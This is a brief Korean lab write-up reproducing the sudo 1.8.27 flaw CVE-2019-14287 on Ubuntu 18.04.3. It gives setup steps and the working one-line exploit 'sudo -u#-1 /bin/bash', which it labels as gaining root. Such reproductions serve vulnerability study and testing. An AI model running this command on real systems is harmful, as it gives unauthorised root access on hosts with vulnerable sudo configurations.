# [목차]
**1. [Environment](#Environment)**

**2. [Setting](#Setting)**

**3. [Exploit](#Exploit)**

**4. [etc](#etc)**


***


# **Environment**

| Type     | OS             | Vulnerable App |
| :---     | :---           | :---           |
| Victim   | Ubuntu 18.04.3 | [sudo 1.8.27](https://github.com/2jinu/CVE/raw/main/LPE/%5BLinux%5D%20CVE-2019-14287/file/sudo-1.8.27.tar.gz) |

# **Setting**

sudo파일 압축 해제

```sh
root@srv:~# tar -xf sudo-1.8.27.tar.gz
```



# **Exploit**

root 권한 획득

```sh
user@srv:~$ sudo -u#-1 /bin/bash
```

# **etc**

sudo 버전 확인

```sh
user@srv:~# sudo -V
```